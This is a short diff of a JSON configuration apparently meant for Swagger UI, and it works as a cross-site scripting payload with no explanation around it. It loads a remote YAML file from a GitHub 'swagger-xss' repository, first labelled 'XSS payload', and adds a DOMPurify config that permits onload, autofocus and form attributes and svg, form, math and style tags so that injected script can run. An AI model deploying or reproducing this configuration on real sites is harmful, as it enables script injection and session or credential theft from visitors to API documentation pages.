@@ -1,9 +1,9 @@
 {
-    "url": "https://raw.githubusercontent.com/unstabl3/swagger-xss/main/123.yaml",
-    "urls": [
-        {
-            "url": "https://raw.githubusercontent.com/unstabl3/swagger-xss/main/123.yaml",
-            "name": "XSS payload"
-        }
-    ]
+  "dompurifyConfig": {
+    "ADD_ATTR": ["onload","autofocus","form"],
+    "ALLOWED_TAGS": ["svg","img","a","form","input","math","mtext","style"]
+  },
+  "urls": [
+    {"name": "x", "url": "https://raw.githubusercontent.com/unstabl3/swagger-xss/main/123.yaml"}
+  ]
 }
